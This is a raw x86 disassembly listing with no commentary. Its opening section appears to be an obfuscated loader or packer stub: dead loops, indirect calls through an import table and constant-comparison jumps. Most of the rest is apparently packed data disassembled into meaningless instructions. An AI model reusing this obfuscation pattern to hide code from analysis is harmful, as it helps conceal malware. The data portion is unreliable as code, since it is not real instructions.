  4029e8:	xor    edi,edi
  4029ea:	xor    esi,ecx
  4029ec:	xor    ebx,0x0
  4029ef:	add    edx,eax
  4029f1:	adc    edi,0xffffffff
  4029f4:	xor    edx,ecx
  4029f6:	xor    edi,0x0
  4029f9:	cmp    edx,esi
  4029fb:	jne    0x402a13
  402a01:	cmp    edi,ebx
  402a03:	jne    0x402a13
  402a09:	mov    eax,ds:0x42e4ab
  402a0e:	mov    ds:0x42e4b3,eax
  402a13:	mov    eax,ds:0x42e42f
  402a18:	push   0x4
  402a1a:	add    eax,0x1cc
  402a1f:	push   eax
  402a20:	lea    eax,[ebp-0x24]
  402a23:	push   eax
  402a24:	call   0x402a39
  402a29:	mov    eax,DWORD PTR [ebp-0x24]
  402a2c:	mov    eax,DWORD PTR [eax]
  402a2e:	pop    ebx
  402a2f:	pop    edi
  402a30:	pop    esi
  402a31:	leave  
  402a32:	ret    0xc
  402a35:	xor    eax,eax
  402a37:	inc    eax
  402a38:	ret    
  402a39:	push   ebp
  402a3a:	mov    ebp,esp
  402a3c:	sub    esp,0x10
  402a3f:	and    DWORD PTR ds:0x42d004,0x0
  402a49:	jmp    0x402a5b
  402a4e:	mov    edx,DWORD PTR ds:0x42d004
  402a54:	inc    edx
  402a55:	mov    DWORD PTR ds:0x42d004,edx
  402a5b:	cmp    DWORD PTR ds:0x42d004,0x1d
  402a62:	jae    0x402a9d
  402a68:	cmp    DWORD PTR ds:0x42d004,0x11
  402a6f:	jne    0x402a7e
  402a75:	push   DWORD PTR [ebp-0x1c]
  402a78:	call   DWORD PTR ds:0x42ed77
  402a7e:	cmp    DWORD PTR ds:0x42d004,0x10
  402a85:	jne    0x402a98
  402a8b:	mov    edx,DWORD PTR ds:0x42d004
  402a91:	inc    edx
  402a92:	mov    DWORD PTR ds:0x42d004,edx
  402a98:	jmp    0x402a4e
  402a9d:	mov    eax,0xf89c85b9
  402aa2:	mov    DWORD PTR [ebp-0x4],eax
  402aa5:	and    edx,0x5cd5
  402aab:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  402ab2:	and    DWORD PTR ds:0x42a000,0x0
  402abc:	jmp    0x402ace
  402ac1:	mov    ecx,DWORD PTR ds:0x42a000
  402ac7:	inc    ecx
  402ac8:	mov    DWORD PTR ds:0x42a000,ecx
  402ace:	cmp    DWORD PTR ds:0x42a000,0x11
  402ad5:	jae    0x402b06
  402adb:	cmp    DWORD PTR ds:0x42a000,0x1c
  402ae2:	jne    0x402afb
  402ae8:	push   0x42e165
  402aed:	push   0x42e185
  402af2:	push   DWORD PTR [ebp-0x28]
  402af5:	call   DWORD PTR ds:0x42ed83
  402afb:	jmp    0x402ac1
  402b00:	adc    ecx,0x6d98
  402b06:	mov    ecx,DWORD PTR [ebp-0x4]
  402b09:	push   esi
  402b0a:	inc    edx
  402b0b:	mov    edx,0x7510899
  402b10:	add    DWORD PTR ds:0x42d004,0x429008
  402b1a:	xor    ecx,edx
  402b1c:	and    DWORD PTR ds:0x42c014,0x0
  402b26:	jmp    0x402b38
  402b2b:	mov    esi,DWORD PTR ds:0x42c014
  402b31:	inc    esi
  402b32:	mov    DWORD PTR ds:0x42c014,esi
  402b38:	cmp    DWORD PTR ds:0x42c014,0x1f
  402b3f:	jae    0x402b67
  402b45:	cmp    DWORD PTR ds:0x42c014,0x26
  402b4c:	jne    0x402b58
  402b52:	call   DWORD PTR ds:0x42ed87
  402b58:	jmp    0x402b2b
  402b5d:	add    DWORD PTR ds:0x42b004,0x42a004
  402b67:	mov    esi,0x3272e0
  402b6c:	xor    DWORD PTR ds:0x42d018,0x42c000
  402b76:	push   edi
  402b77:	adc    DWORD PTR ds:0x42a010,ebx
  402b7d:	mov    edi,DWORD PTR [ebp+0x10]
  402b80:	and    DWORD PTR ds:0x42d010,0x42a00c
  402b8a:	add    ecx,esi
  402b8c:	cmp    ecx,edi
  402b8e:	mov    DWORD PTR ds:0x42b00c,0x360f
  402b98:	je     0x404ff4
  402b9e:	mov    ecx,DWORD PTR [ebp-0x4]
  402ba1:	and    DWORD PTR ds:0x42c014,0x0
  402bab:	mov    edi,DWORD PTR ds:0x42c014
  402bb1:	inc    edi
  402bb2:	mov    DWORD PTR ds:0x42c014,edi
  402bb8:	cmp    DWORD PTR ds:0x42c014,0x25
  402bbf:	jne    0x402bd8
  402bc5:	push   0x1556
  402bca:	push   0x42901c
  402bcf:	push   DWORD PTR [ebp-0x28]
  402bd2:	call   DWORD PTR ds:0x42ed8b
  402bd8:	cmp    DWORD PTR ds:0x42c014,0x1c
  402bdf:	jb     0x402bab
  402be5:	mov    edi,DWORD PTR [ebp+0x10]
  402be8:	xor    eax,eax
  402bea:	xor    ecx,edx
  402bec:	add    ecx,esi
  402bee:	add    edi,0xfabdbee9
  402bf4:	adc    eax,0xffffffff
  402bf7:	xor    eax,0x0
  402bfa:	mov    DWORD PTR [ebp-0xc],eax
  402bfd:	push   ebx
  402bfe:	xor    ebx,ebx
  402c00:	xor    edi,0x8a29a12b
  402c06:	mov    eax,ecx
  402c08:	add    eax,0xfabdbee9
  402c0d:	adc    ebx,0xffffffff
  402c10:	xor    eax,0x8a29a12b
  402c15:	xor    ebx,0x0
  402c18:	cmp    eax,edi
  402c1a:	jne    0x404f86
  402c20:	cmp    ebx,DWORD PTR [ebp-0xc]
  402c23:	je     0x404fee
  402c29:	jmp    0x404f86
  402c2e:	mov    esi,0x3272e0
  402c33:	jmp    0x404f86
  402c38:	xchg   esi,eax
  402c39:	add    bh,ah
  402c3b:	xchg   esp,eax
  402c3c:	mov    ebx,0x3d00957b
  402c41:	dec    esp
  402c42:	ja     0x402c89
  402c44:	push   ds
  402c45:	in     al,dx
  402c46:	outs   dx,DWORD PTR ds:[esi]
  402c47:	scas   eax,DWORD PTR es:[edi]
  402c48:	jp     0x402cc4
  402c4a:	jp     0x402cc6
  402c4c:	dec    esp
  402c4d:	pop    edi
  402c4e:	jp     0x402cca
  402c50:	adc    DWORD PTR [eax],ebp
  402c52:	pop    ss
  402c53:	cmp    eax,0x2f1b2115
  402c58:	popa   
  402c59:	cmp    ah,BYTE PTR [ebp+0x66]
  402c5c:	mov    ah,BYTE PTR [ecx+0x6a]
  402c5f:	push   0x69
  402c61:	xor    al,cl
  402c63:	fdivr  st,st(5)
  402c65:	ins    BYTE PTR es:[edi],dx
  402c66:	inc    esp
  402c67:	imul   edi,DWORD PTR [ebp+0x5b],0xffffffac
  402c6b:	jl     0x402cd6
  402c6d:	push   ebp
  402c6e:	iret   
  402c6f:	pop    ecx
  402c70:	dec    edx
  402c71:	cmp    al,0x88
  402c73:	cli    
  402c74:	xchg   DWORD PTR [esi+0x57],esi
  402c77:	dec    ecx
  402c78:	jg     0x402cb1
  402c7a:	mov    WORD PTR [esi+0x3ba2bc7f],fs
  402c80:	sub    bh,bh
  402c82:	data16 fdivr st,st(2)
  402c85:	push   ebx
  402c86:	jg     0x402ca6
  402c88:	jmp    0xe9faf5c2
  402c8d:	xchg   DWORD PTR [ebx],edx
  402c8f:	fimul  WORD PTR [ebx-0x54aaf0db]
  402c95:	mov    al,al
  402c97:	imul   DWORD PTR [ecx-0x27]
  402c9a:	add    al,dl
  402c9c:	push   cs
  402c9d:	cli    
  402c9e:	es adc al,0x44
  402ca1:	or     BYTE PTR [esi],ah
  402ca3:	imul   esp,DWORD PTR [ebp+esi*4-0x51],0x13
  402ca8:	pop    ebp
  402ca9:	add    DWORD PTR [esi+0x2b45e5ff],esp
  402caf:	jo     0x402ce3
  402cb1:	les    ebx,FWORD PTR [ebx-0xb]
  402cb4:	sbb    bh,dl
  402cb6:	je     0x402c75
  402cb8:	arpl   cx,bx
  402cba:	xchg   esp,eax
  402cbb:	pop    edi
  402cbc:	mov    edi,DWORD PTR [ebp+0x4d821007]
  402cc2:	repz sahf 
  402cc4:	cmp    BYTE PTR [edx+0x73],dh
  402cc7:	or     ebx,edx
  402cc9:	sub    DWORD PTR [edx-0x77],edx
  402ccc:	xor    BYTE PTR [ebx],dh
  402cce:	push   eax
  402ccf:	jecxz  0x402ca0
  402cd1:	mov    ah,BYTE PTR ds:0xc8b7cc85
  402cd7:	test   BYTE PTR [ebp-0x20],ch
  402cda:	inc    ecx
  402cdb:	push   edx
  402cdc:	dec    eax
  402cdd:	or     BYTE PTR [esi],bh
  402cdf:	repz add ebp,DWORD PTR ss:[ecx+0x4ca7ca4b]
  402ce7:	fadd   QWORD PTR [eax]
  402ce9:	push   esi
  402cea:	stc    
  402ceb:	push   edx
  402cec:	push   esi
  402ced:	mov    eax,ds:0xf4bf64f5
  402cf2:	inc    edx
  402cf3:	sbb    al,0x27
  402cf5:	pop    eax
  402cf6:	adc    edx,DWORD PTR [edi+0x30c1a325]
  402cfc:	test   eax,0x6a1a3c37
  402d01:	int3   
  402d02:	xchg   esp,eax
  402d03:	jne    0x402c8c
  402d05:	cmp    edx,eax
  402d07:	push   esp
  402d08:	pop    ebx
  402d09:	loopne 0x402d7d
  402d0b:	lods   al,BYTE PTR ds:[esi]
  402d0c:	fs push es
  402d0e:	mov    BYTE PTR [edi+0x2d54d4ee],cl
  402d14:	push   es
  402d15:	ds emms 
  402d18:	pop    edi
  402d19:	das    
  402d1a:	push   0x40
  402d1c:	pop    esi
  402d1d:	inc    edi
  402d1e:	xor    DWORD PTR [eax-0x58475895],eax
  402d24:	outs   dx,DWORD PTR ds:[esi]
  402d25:	out    0xc8,eax
  402d27:	rcl    DWORD PTR [ecx],cl
  402d29:	xor    eax,DWORD PTR gs:[edx-0x1335258b]
  402d30:	popf   
  402d31:	out    dx,eax
  402d32:	push   edx
  402d33:	mov    edi,0x122b1d80
  402d38:	arpl   si,cx
  402d3a:	jmp    0x402d06
  402d3c:	scas   eax,DWORD PTR es:[edi]
  402d3d:	xor    BYTE PTR [esi+0x6f],ch
  402d40:	xchg   ch,bl
  402d42:	popf   
  402d43:	jb     0x402cfc
  402d45:	inc    esp
  402d46:	pop    ebx
  402d47:	cs (bad) 
  402d49:	pop    ecx
  402d4a:	mov    edx,0xa8ef8192
  402d4f:	sbb    eax,0xdfa6e7bc
  402d54:	mov    bh,0x97
  402d56:	mov    bh,0xce
  402d58:	jle    0x402d94
  402d5a:	mov    ebx,0xf586469f
  402d5f:	mov    al,ds:0x32125426
  402d64:	pushf  
  402d65:	bound  ebp,QWORD PTR [ecx-0x1f7caa80]
  402d6b:	fistp  QWORD PTR [ebp-0x2ce11fab]
  402d71:	xchg   esp,eax
  402d72:	mov    BYTE PTR [edi-0xda40878],bh
  402d78:	in     al,dx
  402d79:	mov    ebp,ebx
  402d7b:	leave  
  402d7c:	cmp    BYTE PTR [eax+0x50],cl
  402d7f:	int    0xbc
  402d81:	adc    eax,0x31979c2e
  402d86:	mov    ds:0x4867e485,al
  402d8b:	popf   
  402d8c:	loop   0x402e02
  402d8e:	(bad)  
  402d8f:	std    
  402d90:	maskmovq mm7,(bad)
  402d91:	idiv   DWORD PTR [edx-0x24820583]
  402d97:	adc    eax,0x3d272a2d
  402d9c:	popf   
  402d9d:	mov    ebp,0x7ed61ef0
  402da2:	pop    DWORD PTR [ecx]
  402da4:	or     BYTE PTR [ecx+0x12],bl
  402da7:	pop    ebx
  402da8:	jae    0x402d98
  402daa:	iret   
  402dab:	out    0x8,al
  402dad:	adc    edx,DWORD PTR [ebx]
  402daf:	lods   al,BYTE PTR ds:[esi]
  402db0:	sbb    eax,0x81c3bb68
  402db5:	jnp    0x402e20
  402db7:	clc    
  402db8:	(bad)  
  402db9:	mov    eax,ebp
  402dbb:	xchg   esi,eax
  402dbc:	pop    esp
  402dbd:	push   eax
  402dbe:	add    edi,DWORD PTR [ebx-0x7b]
  402dc1:	xchg   DWORD PTR [esi+eax*4+0x14bc3e2e],eax
  402dc8:	sub    DWORD PTR [edi],ebx
  402dca:	and    al,0x57
  402dcc:	dec    esi
  402dcd:	cld    
  402dce:	mov    al,ds:0xcb8bf590
  402dd3:	mov    ebx,0xbdf82d11
  402dd8:	std    
  402dd9:	in     al,dx
  402dda:	lock add BYTE PTR [edx-0x3e],al
  402dde:	mov    ebp,edx
  402de0:	mov    esp,0xfabe4e0d
  402de5:	dec    ebp
  402de6:	mov    al,ds:0x81c956cd
  402deb:	xor    eax,0x525b8150
  402df0:	or     eax,eax
  402df2:	mov    ebx,DWORD PTR [ebp-0xd]
  402df5:	push   cs
  402df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402df7:	mov    ch,0x98
  402df9:	fst    st(5)
  402dfb:	das    
  402dfc:	add    ecx,DWORD PTR [ebp+0x11]
  402dff:	stos   BYTE PTR es:[edi],al
  402e00:	mov    esp,0x77966b8a
  402e05:	pop    eax
  402e06:	mov    BYTE PTR [edx+0x37],al
  402e09:	add    eax,0xee3c9cb0
  402e0e:	clc    
  402e0f:	in     al,0x42
  402e11:	mov    esp,0x1ec20614
  402e16:	mov    BYTE PTR [ebx],cl
  402e18:	mov    edx,0x8c51be13
  402e1d:	popa   
  402e1e:	jne    0x402dc3
  402e20:	cmp    BYTE PTR [ebx+0x65],dh
  402e23:	sar    DWORD PTR [edi+0x3c],0x21
  402e27:	(bad)  
  402e28:	adc    eax,0x56410686
  402e2d:	mov    ds:0x61ceaf03,eax
  402e32:	cdq    
  402e33:	mov    eax,edi
  402e35:	cld    
  402e36:	xchg   edi,eax
  402e37:	loope  0x402dde
  402e39:	or     BYTE PTR [edx],0xe9
  402e3c:	(bad)  
  402e3d:	jnp    0x402e60
  402e3f:	icebp  
  402e40:	sbb    bh,bh
  402e42:	bound  ebx,QWORD PTR [ecx+ebx*4-0x7]
  402e46:	and    BYTE PTR [ebp-0x28],dl
  402e49:	xor    dh,BYTE PTR [eax]
  402e4b:	xchg   dh,ch
  402e4d:	pop    edx
  402e4e:	mov    ch,0x14
  402e50:	retf   0x2072
  402e53:	daa    
  402e54:	pushf  
  402e55:	jnp    0x402e6f
  402e57:	or     edi,DWORD PTR [ebp+eax*8+0x731b7198]
  402e5e:	shl    DWORD PTR [esi+0x19e78bf2],cl
  402e64:	ds scas eax,DWORD PTR es:[edi]
  402e66:	push   cs
  402e67:	xchg   DWORD PTR ds:0x59f62a47,edi
  402e6d:	pop    ebp
  402e6e:	rol    BYTE PTR [ebx-0x4c],0xdf
  402e72:	sbb    DWORD PTR [eax],esi
  402e74:	mov    esi,0xa5a69fb9
  402e79:	inc    edx
  402e7a:	adc    BYTE PTR [edi+0x47a1a917],ah
  402e80:	cdq    
  402e81:	popf   
  402e82:	das    
  402e83:	stos   BYTE PTR es:[edi],al
  402e84:	inc    ebx
  402e85:	add    BYTE PTR [edi+0x322c83fa],dl
  402e8b:	cmp    BYTE PTR [esi+0x13],bh
  402e8e:	cmp    DWORD PTR ds:0x3c7ea6b8,edi
  402e94:	inc    ebx
  402e95:	test   al,0x30
  402e97:	jl     0x402eca
  402e99:	dec    esi
  402e9a:	adc    DWORD PTR [edx-0x7aee0217],ebx
  402ea0:	pop    ds
  402ea1:	mov    edx,DWORD PTR [edx*8-0x12658879]
  402ea8:	or     esi,DWORD PTR [esi+0x4fa48a3d]
  402eae:	sbb    DWORD PTR [edx+0x39],0x8edc9227
  402eb5:	mov    ds:0xb7d784ab,al
  402eba:	mov    ds,WORD PTR [ecx-0x2a678cd5]
  402ec0:	jmp    0xb351cd74
  402ec5:	or     eax,0xa24165ff
  402eca:	push   0xffffffe9
  402ecc:	fs jl  0x402e71
  402ecf:	xchg   ecx,eax
  402ed0:	out    dx,al
  402ed1:	xor    BYTE PTR [ebx],0x40
  402ed4:	jnp    0x402e68
  402ed6:	jmp    0x6f65b343
  402edb:	enter  0x73f4,0xab
  402edf:	imul   edx,DWORD PTR ds:0x5963b110,0x3eece4cb
  402ee9:	jb     0x402eed
  402eeb:	fild   QWORD PTR [esi+0x1d68ce76]
  402ef1:	xor    esi,DWORD PTR [ecx+0x57]
  402ef4:	pop    eax
  402ef5:	je     0x402f1d
  402ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ef8:	pop    ebx
  402ef9:	fstp   TBYTE PTR [ebx-0x6a]
  402efc:	dec    esi
  402efd:	(bad)  
  402efe:	xchg   esi,eax
  402eff:	hlt    
  402f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f01:	dec    ecx
  402f02:	bnd jl 0x402eb2
  402f05:	pusha  
  402f06:	and    DWORD PTR [ecx],ecx
  402f08:	and    eax,0xc6c754b4
  402f0d:	mov    dh,bl
  402f0f:	push   0x73
  402f11:	sbb    BYTE PTR [esi+edx*1-0x592b0d3f],bh
  402f18:	push   ds
  402f19:	call   0x9d9784f3
  402f1e:	add    DWORD PTR [edx],edx
  402f20:	call   0x7f6b7a83
  402f25:	cmp    al,0xbd
  402f27:	je     0x402f9b
  402f29:	cmp    al,0x9d
  402f2b:	hlt    
  402f2c:	mov    al,ds:0xbeeaa19d
  402f31:	imul   esi,DWORD PTR [edx+0x7f],0x10160c39
  402f38:	jmp    0x402ed0
  402f3a:	sub    eax,0x2093e657
  402f3f:	sbb    eax,0xaadfcedd
  402f44:	fwait
  402f45:	lea    eax,[edx+0x63fde34f]
  402f4b:	mov    ds:0x74647f24,al
  402f50:	dec    esp
  402f51:	retf   
  402f52:	int    0xbb
  402f54:	mov    BYTE PTR [ebx+esi*1],al
  402f57:	dec    eax
  402f58:	in     al,0x23
  402f5a:	jecxz  0x402f64
  402f5c:	fwait
  402f5d:	retf   
  402f5e:	sbb    dl,BYTE PTR [ecx+esi*8-0x1d915da9]
  402f65:	inc    eax
  402f66:	push   esp
  402f67:	jp     0x402f39
  402f69:	adc    ebp,DWORD PTR [eax]
  402f6b:	jb     0x402f97
  402f6d:	push   ecx
  402f6e:	push   eax
  402f6f:	fwait
  402f70:	sbb    cl,BYTE PTR [edx+0x2e]
  402f73:	je     0x402fda
  402f75:	add    eax,0x5c55f8ce
  402f7a:	test   eax,0xe952f799
  402f7f:	out    0xd3,eax
  402f81:	mov    dh,0xbf
  402f83:	mov    esp,0x7fed1eb1
  402f88:	setp   BYTE PTR [ebp+0x7e]
  402f8c:	aam    0xf9
  402f8e:	call   0x997a:0x4326d1b3
  402f95:	mov    eax,ds:0xe4b0ad67
  402f9a:	adc    esp,DWORD PTR [edx+0x34c4d1e0]
  402fa0:	xchg   bl,bl
  402fa2:	jnp    0x402f25
  402fa4:	scas   eax,DWORD PTR es:[edi]
  402fa5:	push   ecx
  402fa6:	sbb    eax,0x8de2158a
  402fab:	mov    ebp,0xcc10f322
  402fb0:	(bad)  
  402fb1:	mov    WORD PTR [esi-0x1469d0d8],fs
  402fb7:	xor    al,0xdb
  402fb9:	sbb    ebp,DWORD PTR [edx-0x3a9a3ed4]
  402fbf:	sbb    edi,DWORD PTR [edi-0x1e351dc3]
  402fc5:	in     al,dx
  402fc6:	cs push ebp
  402fc8:	aas    
  402fc9:	cli    
  402fca:	ss icebp 
  402fcc:	mov    ds,WORD PTR [edi+0x0]
  402fcf:	pop    ss
  402fd0:	mov    BYTE PTR [ebx+0x2e],bh
  402fd3:	div    BYTE PTR fs:[ebp+0x3ab224c7]
  402fda:	cmp    edi,DWORD PTR [eax-0x74]
  402fdd:	test   ecx,esp
  402fdf:	pop    esi
  402fe0:	xlat   BYTE PTR ds:[ebx]
  402fe1:	stc    
  402fe2:	outs   dx,BYTE PTR ds:[esi]
  402fe3:	jecxz  0x402fd2
  402fe5:	fdivr  st,st(4)
  402fe7:	and    edx,DWORD PTR [ecx+0x43]
  402fea:	(bad)  
  402feb:	jmp    0x402f7c
  402fed:	(bad)  
  402fee:	mov    ebp,0x8986399c
  402ff3:	retf   0x9863
  402ff6:	pop    ds
  402ff7:	jl     0x402fb8
  402ff9:	mov    ch,0x83
  402ffb:	data16 test BYTE PTR [ecx+0x1],dl
  402fff:	and    al,0xf6
  403001:	cmp    DWORD PTR [edi],0x27
  403004:	stos   DWORD PTR es:[edi],eax
  403005:	inc    edx
  403006:	aas    
  403007:	aad    0xbf
  403009:	lds    edi,FWORD PTR [edx]
  40300b:	push   0xffffffd5
  40300d:	lock popa 
  40300f:	scas   eax,DWORD PTR es:[edi]
  403010:	sbb    BYTE PTR [ecx+0x58],cl
  403013:	inc    edx
  403014:	test   eax,0xd96bd27b
  403019:	in     eax,dx
  40301a:	stos   BYTE PTR es:[edi],al
  40301b:	enter  0x1319,0x2f
  40301f:	test   DWORD PTR [edx+0x1b5109e],0x5a0d297e
  403029:	(bad)  
  40302a:	lock mov al,0xc9
  40302d:	in     al,0xd
  40302f:	jbe    0x402fb9
  403031:	repnz sbb esi,DWORD PTR [ebx+0x47b515a]
  403038:	test   DWORD PTR [esi+0x6de0ccd4],ecx
  40303e:	iret   
  40303f:	mov    cl,0x2c
  403041:	scas   al,BYTE PTR es:[edi]
  403042:	jle    0x40307d
  403044:	inc    eax
  403045:	cmp    al,0xad
  403047:	jl     0x403056
  403049:	and    bh,BYTE PTR [edi-0x4b047c9]
  40304f:	xor    BYTE PTR [eax+0x39],bh
  403052:	in     al,0xf4
  403054:	bound  eax,QWORD PTR [ebp-0x6023dcf5]
  40305a:	push   ecx
  40305b:	mov    al,ds:0x41a7f624
  403060:	shl    DWORD PTR [ebx],1
  403062:	retf   0xc54c
  403065:	in     al,dx
  403066:	push   ecx
  403067:	cmp    dh,al
  403069:	mov    ds:0xfde82f0d,eax
  40306e:	adc    al,0xe4
  403070:	in     eax,0x8b
  403072:	lods   eax,DWORD PTR ds:[esi]
  403073:	outs   dx,BYTE PTR ds:[esi]
  403074:	dec    eax
  403075:	pop    esp
  403076:	push   esp
  403077:	mov    eax,0x85f87807
  40307c:	sbb    BYTE PTR [edx+0x51a594ec],0x59
  403083:	sub    ebp,esp
  403085:	mov    ch,0x79
  403087:	jp     0x40303c
  403089:	sbb    bl,BYTE PTR [ecx-0x7d]
  40308c:	lea    ebx,[edx+0x3f]
  40308f:	push   esp
  403090:	and    ecx,ecx
  403092:	fisttp DWORD PTR [edi-0x45]
  403095:	(bad)  
  403096:	cli    
  403097:	dec    edi
  403098:	or     BYTE PTR [ecx],bl
  40309a:	pop    esp
  40309b:	fisttp QWORD PTR [esi+0x7b6abe7c]
  4030a1:	dec    ebx
  4030a2:	mov    DWORD PTR [edi],edi
  4030a4:	bound  esp,QWORD PTR [edi+eiz*2-0x70]
  4030a8:	jle    0x4030ce
  4030aa:	mov    ds:0xb6b513c1,al
  4030af:	sbb    DWORD PTR [ebp+edx*2+0x47],0x2d106799
  4030b7:	imul   ebx,esp,0x70
  4030ba:	fidiv  WORD PTR [ebp-0x286a0deb]
  4030c0:	sbb    bh,BYTE PTR [esi+esi*4+0x79]
  4030c4:	out    dx,eax
  4030c5:	mov    bl,0x99
  4030c7:	push   eax
  4030c8:	or     ch,BYTE PTR [edi-0x77]
  4030cb:	in     al,0xe3
  4030cd:	pusha  
  4030ce:	nop
  4030cf:	das    
  4030d0:	scas   al,BYTE PTR es:[edi]
  4030d1:	test   al,0x39
  4030d3:	sub    eax,esi
  4030d5:	es mov eax,0x31701720
  4030db:	lock retf 0x6af3
  4030df:	nop
  4030e0:	outs   dx,BYTE PTR ds:[esi]
  4030e1:	popa   
  4030e2:	enter  0x28a0,0xe1
  4030e6:	(bad)  
  4030e7:	and    DWORD PTR [ebp+0x54071752],esi
  4030ed:	jne    0x4030e3
  4030ef:	fwait
  4030f0:	dec    eax
  4030f1:	popf   
  4030f2:	lahf   
  4030f3:	aad    0xff
  4030f5:	push   esi
  4030f6:	mov    ds:0x5fc86b84,eax
  4030fb:	push   es
  4030fc:	(bad)  
  4030fd:	sti    
  4030fe:	pop    es
  4030ff:	fmul   st,st(1)
  403101:	outs   dx,DWORD PTR ds:[esi]
  403102:	xchg   esp,eax
  403103:	pop    edx
  403104:	inc    ebp
  403105:	jecxz  0x403134
  403107:	mov    bh,0x61
  403109:	repnz test cl,cl
  40310c:	inc    esi
  40310d:	jp     0x4030e8
  40310f:	pusha  
  403110:	inc    esp
  403111:	into   
  403112:	loope  0x40309a
  403114:	cmp    BYTE PTR [ebx-0x12],bh
  403117:	call   0xf4bc:0x4d842f5c
  40311e:	icebp  
  40311f:	pop    ecx
  403120:	pop    ss
  403121:	sahf   
  403122:	xrelease xchg DWORD PTR [esi-0x69],ebx
  403126:	push   ss
  403127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403128:	sbb    BYTE PTR [esi-0x742e3b8f],bl
  40312e:	jmp    FWORD PTR [esi]
  403130:	and    bh,bh
  403132:	mov    ebx,0x2f575818
  403137:	pop    esi
  403138:	cli    
  403139:	inc    eax
  40313a:	jno    0x403163
  40313c:	add    DWORD PTR [ebp+0x28],ecx
  40313f:	jmp    0x12dfcd03
  403144:	add    eax,0xb8f6d79
  403149:	sub    DWORD PTR [ecx],ebx
  40314b:	int    0xdd
  40314d:	ins    DWORD PTR es:[edi],dx
  40314e:	adc    DWORD PTR [ebx+0x6d],edi
  403151:	sub    dl,BYTE PTR [edi+0x17301473]
  403157:	lds    edx,FWORD PTR [edi+edx*4-0x61]
  40315b:	int3   
  40315c:	lahf   
  40315d:	pop    ebx
  40315e:	lods   eax,DWORD PTR ds:[esi]
  40315f:	mov    esp,0xcdb179e4
  403164:	stos   BYTE PTR es:[edi],al
  403165:	dec    ebp
  403166:	add    bh,BYTE PTR [ecx]
  403168:	adc    eax,0xe6a07d57
  40316d:	in     al,0x6f
  40316f:	in     al,0x93
  403171:	retf   0x2307
  403174:	mov    bh,0x2b
  403176:	pop    ss
  403177:	ficom  DWORD PTR [eax]
  403179:	xor    DWORD PTR [esi],ebx
  40317b:	mov    BYTE PTR [esi+ecx*4],bh
  40317e:	push   esi
  40317f:	inc    esi
  403180:	inc    eax
  403181:	pusha  
  403182:	in     eax,dx
  403183:	xchg   ecx,eax
  403184:	inc    esi
  403185:	test   al,0xdb
  403187:	repnz iret 
  403189:	push   es
  40318a:	or     al,0x72
  40318c:	fimul  DWORD PTR [ebx+0x48]
  40318f:	xchg   ebx,eax
  403190:	jae    0x40311c
  403192:	mov    al,gs:0xf04ad641
  403198:	dec    esi
  403199:	push   0x739de4ce
  40319e:	(bad)  
  40319f:	fs xor ah,bh
  4031a2:	call   0xb886:0xc1ed43f8
  4031a9:	xor    BYTE PTR [edx-0x70738724],0xcf
  4031b0:	call   0x8e90:0xb70852e5
  4031b7:	sbb    BYTE PTR [eax],dh
  4031b9:	mov    edi,esi
  4031bb:	inc    eax
  4031bc:	fst    DWORD PTR [eax+0x192dcbcd]
  4031c2:	inc    ebx
  4031c3:	ins    DWORD PTR es:[edi],dx
  4031c4:	loop   0x403213
  4031c6:	pop    ss
  4031c7:	jg     0x40318a
  4031c9:	jb     0x40314f
  4031cb:	add    eax,DWORD PTR [esp+eiz*2]
  4031ce:	cld    
  4031cf:	pop    ds
  4031d0:	mov    esi,0x18d3362f
  4031d5:	fwait
  4031d6:	xchg   ebp,eax
  4031d7:	xchg   ebp,eax
  4031d8:	cmp    eax,0x96c5de19
  4031dd:	inc    edi
  4031de:	dec    ebp
  4031df:	and    BYTE PTR [esi-0x33],ch
  4031e2:	sbb    DWORD PTR [edx+eax*2],ecx
  4031e5:	and    bl,0xd7
  4031e8:	in     eax,0x23
  4031ea:	sub    eax,0x26591631
  4031ef:	or     edx,esi
  4031f1:	(bad)  
  4031f3:	int    0x97
  4031f5:	in     al,dx
  4031f6:	iret   
  4031f7:	xor    al,0x4a
  4031f9:	mov    al,0xe4
  4031fb:	shl    BYTE PTR [edx+0xca1df76],cl
  403201:	dec    edx
  403202:	in     eax,dx
  403203:	xor    esi,edx
  403205:	mov    dl,bh
  403207:	es das 
  403209:	jne    0x4031cb
  40320b:	inc    esp
  40320c:	mov    ebp,esp
  40320e:	jno    0x40321c
  403210:	iret   
  403211:	cli    
  403212:	adc    DWORD PTR [esi+ebp*2+0x5c],0xffffffb7
  403217:	pop    ebx
  403218:	mov    edi,0x37a0aedc
  40321d:	mov    al,ds:0xc409eff5
  403222:	data16 ja 0x403226
  403225:	cmc    
  403226:	xchg   DWORD PTR [esi],esp
  403228:	fsub   QWORD PTR [ebp-0x171561f8]
  40322e:	fwait
  40322f:	inc    ebx
  403230:	test   DWORD PTR [ecx-0x20],eax
  403233:	(bad)  
  403234:	out    0xdb,eax
  403236:	rol    BYTE PTR [ecx-0x73],cl
  403239:	popf   
  40323a:	mov    ds:0x83390250,eax
  40323f:	mov    gs,WORD PTR [ebx+0x13]
  403242:	(bad)  
  403244:	adc    al,0x3
  403246:	adc    BYTE PTR [edi+0x2d],0x41
  40324a:	rcr    BYTE PTR [ecx-0xcae4950],1
  403250:	clc    
  403251:	cdq    
  403252:	inc    ebp
  403253:	mov    esp,0x127e101c
  403258:	ja     0x403276
  40325a:	and    eax,0xcec16dc2
  40325f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403260:	cmp    al,0x5
  403262:	loopne 0x40323b
  403264:	push   ecx
  403265:	adc    al,0x45
  403267:	sub    BYTE PTR [edx+0x34],ah
  40326a:	fld    DWORD PTR [eax]
  40326c:	aad    0x5a
  40326e:	in     eax,0xeb
  403270:	lds    ebp,FWORD PTR [edx]
  403272:	rcr    DWORD PTR [esi],1
  403274:	xchg   ebx,eax
  403275:	test   BYTE PTR [ebp+0x2a],bl
  403278:	cli    
  403279:	rcl    ebx,cl
  40327b:	(bad)  
  40327c:	xlat   BYTE PTR ds:[ebx]
  40327d:	cdq    
  40327e:	inc    esp
  40327f:	xchg   DWORD PTR [esi+0x24],eax
  403282:	or     eax,0xd787fb85
  403287:	mov    ebp,0x665314df
  40328c:	push   es
  40328d:	cmp    eax,ebp
  40328f:	add    esi,DWORD PTR [eax]
  403291:	ret    0x79df
  403294:	int    0xe4
  403296:	mov    ebx,0x59179518
